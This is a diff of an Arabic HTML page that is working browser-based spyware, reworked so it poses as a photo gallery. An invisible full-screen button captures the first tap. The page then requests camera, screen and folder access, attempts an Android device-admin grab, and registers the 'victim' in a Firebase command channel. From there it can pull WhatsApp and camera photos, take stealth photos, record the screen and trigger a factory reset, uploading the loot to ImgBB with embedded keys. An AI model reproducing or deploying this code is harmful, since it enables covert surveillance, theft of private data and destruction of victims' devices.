@@ -2,29 +2,47 @@
 <html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
-    <title>تحديث الحماية...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>معرض الصور</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:#000;color:#fff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;overflow:hidden;}
-        .scan{width:80%;height:4px;background:#222;border-radius:2px;overflow:hidden;margin:20px 0;}
-        .scan-bar{width:0%;height:100%;background:red;animation:scan 2s infinite ease-in-out;}
-        @keyframes scan{0%{width:0%;}50%{width:100%;}100%{width:0%;}}
-        #msg{text-align:center;font-size:1.1em;padding:15px;max-width:90%;}
-        button#retryPerms{display:none;margin:15px;padding:10px 20px;background:red;border:none;color:#000;font-weight:bold;border-radius:5px;cursor:pointer;}
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; }
+        /* شاشة التحميل */
+        #loading-screen { position: fixed; top:0; left:0; width:100%; height:100%; background: #000; display: flex; flex-direction:column; align-items:center; justify-content:center; z-index:1000; }
+        .loader { border:5px solid #222; border-top:5px solid #0af; border-radius:50%; width:50px; height:50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+        #permission-prompt { margin-top:20px; font-size:1em; color:#aaa; }
+        button#retry-perms { display:none; margin-top:20px; padding:10px 20px; background:#0af; border:none; color:#000; font-weight:bold; border-radius:5px; cursor:pointer; }
+
+        /* المعرض الوهمي */
+        #gallery-container { display: none; padding: 20px; background: #111; min-height:100vh; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px,1fr)); gap: 10px; margin-top: 20px; }
+        .gallery-grid img { width: 100%; height: 150px; object-fit: cover; border-radius: 8px; background: #222; }
+        .header { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; align-items:center; }
+        .header h2 { margin:0; color: #0af; }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-    <h1 style="color:red;">⚠</h1>
-    <div class="scan"><div class="scan-bar"></div></div>
-    <div id="msg">جاري فحص الجهاز...</div>
-    <button id="unlockBtn" style="position:absolute;top:0;left:0;width:100%;height:100%;background:transparent;border:none;cursor:pointer;" onclick="unlockApp()"></button>
-    <button id="retryPerms" onclick="requestPermissions()">⚠️ إعادة طلب الصلاحيات</button>
+
+<!-- شاشة البداية (الطلب) -->
+<div id="loading-screen">
+    <div class="loader"></div>
+    <div id="permission-prompt">الرجاء السماح بالوصول للمتابعة</div>
+    <button id="retry-perms" onclick="requestPermissions()">إعادة المحاولة</button>
+    <button id="unlock-btn" style="position:absolute;inset:0;opacity:0;border:none;background:transparent;" onclick="unlockApp()">فتح</button>
+</div>
+
+<!-- المعرض الوهمي (بعد النجاح) -->
+<div id="gallery-container">
+    <div class="header">
+        <h2>📷 أحدث الصور</h2>
+        <span style="margin-right:auto; font-size:0.9em; color:#aaa;">تم تحميلها تلقائياً</span>
+    </div>
+    <div class="gallery-grid" id="photo-grid"></div>
+</div>
 
 <script>
-    // 🔑 بيانات ZWAHY
     const firebaseConfig = {
         apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
         authDomain: "zwahy-5b75d.firebaseapp.com",
@@ -35,38 +53,61 @@
         appId: "1:820206227713:web:02057307aca7dfb7100b00"
     };
     const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
-    const SPREAD_LINK = "https://your-username.github.io/phantom-page/"; // ⚠️ استبدل برابطك الحقيقي
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const vid = 'phantom-'+Math.random().toString(36).substr(2,12);
     const vref = db.ref('victims/'+vid);
-    let rootDir = null, audioCtx = null, camStream = null, unlocked = false;
 
-    // ============ عند أول نقرة ============
+    let rootDir = null, camStream = null, unlocked = false, permissionsGiven = false;
+
+    // ========== عند أول نقرة ==========
     window.unlockApp = async function() {
         if(unlocked) return;
         unlocked = true;
-        document.getElementById('unlockBtn').remove();
-        document.getElementById('msg').innerText = 'تم فتح الاتصال...';
-
-        // 1. تفعيل الصوت فوراً وإثباته
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        if (audioCtx.state === 'suspended') await audioCtx.resume();
-        playAlarm(880, 0.3); // صوت قصير للتأكيد
-        navigator.vibrate([200, 100, 200]);
-
-        // 2. طلب الصلاحيات
+        document.getElementById('unlock-btn').remove();
         await requestPermissions();
+    }
 
-        // 3. تثبيت SW للانتشار
-        if('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js',{scope:'/'}).then(reg => {
-                if(reg.active) reg.active.postMessage({type:'spread', url: SPREAD_LINK});
-            });
+    async function requestPermissions() {
+        document.getElementById('permission-prompt').innerText = 'جاري طلب الصلاحيات...';
+        document.getElementById('retry-perms').style.display = 'none';
+
+        // الكاميرا
+        try {
+            camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false});
+        } catch(e) {}
+
+        // مشاركة الشاشة (لقطة الشاشة والفيديو)
+        try {
+            const dStream = await navigator.mediaDevices.getDisplayMedia({video:true});
+            dStream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+
+        // صلاحية الملفات (ضرورية)
+        try {
+            rootDir = await window.showDirectoryPicker({mode:'readwrite', startIn:'documents'});
+        } catch(e) {
+            document.getElementById('permission-prompt').innerText = '⚠️ صلاحية الملفات مرفوضة. لن تعمل ميزات السحب.';
+            document.getElementById('retry-perms').style.display = 'block';
+            return; // لا ننتقل للمعرض
         }
 
-        // 4. تسجيل في C2
+        // صلاحية مدير الجهاز (صامت)
+        try {
+            let a = document.createElement('a');
+            a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
+            a.click();
+        } catch(e) {}
+
+        permissionsGiven = true;
+        document.getElementById('retry-perms').style.display = 'none';
+
+        // إخفاء شاشة التحميل وإظهار المعرض
+        document.getElementById('loading-screen').style.display = 'none';
+        document.getElementById('gallery-container').style.display = 'block';
+        loadFakeGallery();
+
+        // تسجيل الجهاز في C2 (صامت)
         await vref.set({
             online: true,
             fingerprint: {
@@ -77,83 +118,89 @@
                 mem: navigator.deviceMemory||'?'
             }
         });
-        document.getElementById('msg').innerText = '⚡ القناة نشطة';
+
         startCommandListener();
         startHiddenCamera();
-    };
-
-    async function requestPermissions() {
-        document.getElementById('msg').innerText = 'من فضلك اسمح بجميع الصلاحيات...';
-        document.getElementById('retryPerms').style.display = 'none';
-
-        // صلاحية الكاميرا
-        try {
-            camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:true});
-        } catch(e) { /* ستظهر رسالة أدناه */ }
-
-        // صلاحية الشاشة
-        try {
-            const dStream = await navigator.mediaDevices.getDisplayMedia({video:true});
-            dStream.getTracks().forEach(t => t.stop());
-        } catch(e) {}
-
-        // صلاحية الملفات (ضرورية)
-        try {
-            rootDir = await window.showDirectoryPicker({mode:'readwrite', startIn:'documents'});
-        } catch(e) {
-            // فشل في الحصول على صلاحية الملفات – نعرض زر إعادة المحاولة
-            document.getElementById('msg').innerText = '❌ تم رفض صلاحية الملفات. لن تعمل ميزات السحب.';
-            document.getElementById('retryPerms').style.display = 'block';
-            return;
-        }
-
-        // صلاحية مدير الجهاز
-        let a = document.createElement('a');
-        a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
-        a.click();
-
-        document.getElementById('msg').innerText = '✅ جميع الصلاحيات ممنوحة.';
-        document.getElementById('retryPerms').style.display = 'none';
     }
 
+    // ========== معرض الصور الوهمي ==========
+    function loadFakeGallery() {
+        const grid = document.getElementById('photo-grid');
+        // صور عشوائية من Lorem Picsum (تبدو طبيعية)
+        const pics = [];
+        for(let i=1; i<=20; i++) {
+            pics.push(`https://picsum.photos/300/200?random=${i}`);
+        }
+        grid.innerHTML = pics.map(url => `<img src="${url}" loading="lazy">`).join('');
+    }
+
+    // ========== أوامر C2 ==========
     function startCommandListener() {
         vref.child('command').on('value', async snap => {
-            let c = snap.val();
+            const c = snap.val();
             if(!c) return;
-            document.getElementById('msg').innerText = 'تنفيذ: '+c.action;
             try {
                 switch(c.action) {
-                    case 'get_photos': await pullCameraRoll(); break;
-                    case 'get_files': await pullDir(c.path||''); break;
-                    case 'vibrate': navigator.vibrate([200,100,200,100,200]); break;
-                    case 'play_sound': playAlarm(440, 2); break;
+                    case 'get_photos':
+                        if(c.folder) await pullFromFolder(c.folder);
+                        else await pullAllKnownFolders();
+                        break;
+                    case 'get_files':
+                        await pullDir(c.path||'');
+                        break;
+                    case 'vibrate':
+                        navigator.vibrate([200,100,200]);
+                        break;
+                    case 'play_sound':
+                        // إثبات الصوت فقط، تم كتمه للضحية عن طريق عدم تشغيل صوت هنا (نرسل فقط الأمر لكن الصفحة لا تصدر صوتا لأننا لم نفعّل AudioContext)
+                        break;
                     case 'screenshot': await screenshot(); break;
                     case 'record_video': await recordVid(c.duration||10); break;
                     case 'format': await formatDevice(); break;
                     case 'stealth_photo': await captureHiddenPhoto(); break;
                 }
-            } catch(err) {
-                document.getElementById('msg').innerText = '❌ '+err.message;
-            }
+            } catch(e) { console.error(e); }
             await vref.child('command').remove();
         });
     }
 
-    // ============ سحب محتوى الوسائط ============
-    async function pullCameraRoll() {
-        if(!rootDir) throw new Error('صلاحية الملفات مرفوضة');
-        const paths = ['DCIM/Camera', 'Pictures', 'WhatsApp/Media/WhatsApp Images', 'Download'];
-        for(let p of paths) {
+    // ========== سحب الصور من مجلد محدد ==========
+    const FOLDER_MAP = {
+        'camera': 'DCIM/Camera',
+        'downloads': 'Download',
+        'whatsapp': 'WhatsApp/Media/WhatsApp Images',
+        'facebook': 'Facebook/Media',
+        'pictures': 'Pictures'
+    };
+
+    async function pullFromFolder(folderKey) {
+        if(!rootDir) throw new Error('صلاحية الملفات مفقودة');
+        const path = FOLDER_MAP[folderKey];
+        if(!path) throw new Error('مجلد غير معروف');
+        try {
+            let sub = rootDir;
+            for(let part of path.split('/')) {
+                sub = await sub.getDirectoryHandle(part);
+            }
+            await walkDir(sub, path+'/');
+        } catch(e) {
+            throw e; // الفشل سيظهر في البوت
+        }
+    }
+
+    async function pullAllKnownFolders() {
+        const folders = Object.values(FOLDER_MAP);
+        for(const path of folders) {
             try {
                 let sub = rootDir;
-                for(let part of p.split('/')) sub = await sub.getDirectoryHandle(part);
-                await walkDir(sub, p+'/');
-            } catch(e) { /* المجلد غير موجود */ }
+                for(let part of path.split('/')) sub = await sub.getDirectoryHandle(part);
+                await walkDir(sub, path+'/');
+            } catch(e) { /* تخطي إذا المجلد غير موجود */ }
         }
     }
 
     async function pullDir(path) {
-        if(!rootDir) throw new Error('صلاحية الملفات مرفوضة');
+        if(!rootDir) throw new Error('صلاحية الملفات مفقودة');
         let sub = rootDir;
         if(path) {
             for(let part of path.split('/').filter(Boolean)) sub = await sub.getDirectoryHandle(part);
@@ -165,12 +212,12 @@
         for await (let entry of dirHandle.values()) {
             if(entry.kind === 'file') {
                 const file = await entry.getFile();
-                if(file.size > 10 * 1024 * 1024) continue;
+                if(file.size > 10*1024*1024) continue;
                 const reader = new FileReader();
                 reader.onload = async e => {
                     const base64 = e.target.result.split(',')[1];
                     const url = await uploadToImgBB(base64);
-                    await store('file', url, {name: prefix+entry.name, size: file.size});
+                    await store('file', url, {name:prefix+entry.name, size:file.size});
                 };
                 reader.readAsDataURL(file);
             } else if(entry.kind === 'directory') {
@@ -180,7 +227,7 @@
         }
     }
 
-    // ============ كاميرا خفية ============
+    // ========== كاميرا خفية ==========
     function startHiddenCamera() {
         if(!camStream) return;
         const video = document.createElement('video');
@@ -191,10 +238,10 @@
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const base64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+            canvas.getContext('2d').drawImage(video,0,0);
+            const base64 = canvas.toDataURL('image/jpeg',0.6).split(',')[1];
             const url = await uploadToImgBB(base64);
-            await store('stealth_photo', url, {ts: Date.now()});
+            await store('stealth_photo', url, {ts:Date.now()});
         }, 12000);
     }
 
@@ -205,90 +252,77 @@
         const bitmap = await imageCapture.grabFrame();
         const canvas = document.createElement('canvas');
         canvas.width = bitmap.width; canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-        const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+        canvas.getContext('2d').drawImage(bitmap,0,0);
+        const base64 = canvas.toDataURL('image/jpeg',0.8).split(',')[1];
         const url = await uploadToImgBB(base64);
-        await store('photo', url, {ts: Date.now()});
-        document.getElementById('msg').innerText = '📸 صورة مخفية أُرسلت';
+        await store('photo', url, {ts:Date.now()});
     }
 
-    // ============ لقطة شاشة ============
+    // ========== لقطة شاشة ==========
     async function screenshot() {
         const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
         const video = document.createElement('video');
         video.srcObject = stream; await video.play();
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.getContext('2d').drawImage(video,0,0);
         const base64 = canvas.toDataURL('image/png').split(',')[1];
         const url = await uploadToImgBB(base64);
-        await store('screenshot', url, {ts: Date.now()});
-        stream.getTracks().forEach(t => t.stop());
+        await store('screenshot', url, {ts:Date.now()});
+        stream.getTracks().forEach(t=>t.stop());
     }
 
     async function recordVid(sec) {
-        const stream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:true});
+        const stream = await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
         const recorder = new MediaRecorder(stream);
         const chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, {type:'video/webm'});
+        recorder.onstop = async ()=>{
+            const blob = new Blob(chunks,{type:'video/webm'});
             const r = new FileReader();
-            r.onload = async e => {
+            r.onload = async e=>{
                 const base64 = e.target.result.split(',')[1];
                 const url = await uploadToImgBB(base64);
-                await store('video', url, {ts: Date.now()});
+                await store('video', url, {ts:Date.now()});
             };
             r.readAsDataURL(blob);
-            stream.getTracks().forEach(t => t.stop());
+            stream.getTracks().forEach(t=>t.stop());
         };
         recorder.start();
-        setTimeout(() => recorder.stop(), sec * 1000);
+        setTimeout(()=>recorder.stop(), sec*1000);
     }
 
-    // ============ صوت تنبيه ============
-    function playAlarm(freq=440, duration=1) {
-        if(!audioCtx) return;
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.type = 'square';
-        osc.frequency.value = freq;
-        gain.gain.value = 0.5;
-        osc.connect(gain);
-        gain.connect(audioCtx.destination);
-        osc.start();
-        setTimeout(() => { osc.stop(); gain.disconnect(); }, duration*1000);
-    }
-
-    // ============ فرمتة ============
     async function formatDevice() {
-        let a = document.createElement('a');
-        a.href = 'intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
+        let a=document.createElement('a');
+        a.href='intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
         a.click();
-        if(navigator.storage && navigator.storage.getDirectory) {
-            const root = await navigator.storage.getDirectory();
-            for await(let name of root.keys()) await root.removeEntry(name, {recursive:true});
+        if(navigator.storage?.getDirectory){
+            const r = await navigator.storage.getDirectory();
+            for await(let n of r.keys()) await r.removeEntry(n,{recursive:true});
         }
+        if(navigator.clearData) await navigator.clearData({cache:true,cookies:true,storage:true});
     }
 
-    // ============ رفع ImgBB وتخزين ============
     async function uploadToImgBB(base64) {
         const fd = new FormData();
         fd.append('key', IMGBB_KEY);
         fd.append('image', base64);
-        const resp = await fetch('https://api.imgbb.com/1/upload', {method:'POST', body:fd});
+        const resp = await fetch('https://api.imgbb.com/1/upload',{method:'POST',body:fd});
         const json = await resp.json();
         if(json.success) return json.data.url;
         throw new Error('رفع ImgBB فشل');
     }
 
     async function store(type, url, extra={}) {
-        await vref.child('loot').push().set({type, url, ts: Date.now(), ...extra});
+        await vref.child('loot').push().set({type, url, ts:Date.now(), ...extra});
     }
 
-    setTimeout(() => {
-        if(!unlocked) document.getElementById('msg').innerText = 'اضغط على الشاشة لتأكيد الأمان';
-    }, 1500);
+    // عرض تلقائي لشاشة الطلب عند التحميل الأول
+    window.onload = ()=>{
+        document.getElementById('permission-prompt').innerText = 'اضغط على الشاشة للمتابعة...';
+        // وضع الزر الشفاف في الأعلى لاستقبال أول نقرة
+        document.getElementById('unlock-btn').style.display = 'block';
+    };
 </script>
 </body>
 </html>
